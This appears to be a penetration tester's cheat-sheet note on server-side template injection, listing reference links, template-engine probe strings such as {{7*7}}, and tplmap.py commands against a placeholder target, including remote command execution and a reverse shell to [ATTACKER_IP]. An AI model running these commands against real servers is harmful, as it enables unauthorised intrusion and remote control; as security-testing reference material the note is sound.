#ssti

## Resources
- [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) 
- [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection)

## Manual
```
{{7*7}}
```

```
${7*7}
```

```
<%= 7*7 %>
```

```
${{7*7}}
```

```
#{7*7}
```


![[ssti-identificaiton-hacktricks.png]]


## Tool - tplmap.py
```
tplmap.py -u http://[TARGET_IP]/ -d 'myParam'
tplmap.py -u http://[TARGET_IP]/ -d 'myParam' --os-cmd "id"
tplmap.py -u http://[TARGET_IP]/ -d 'myParam' --reverse-shell [ATTACKER_IP] [ATTACKER_PORT]
```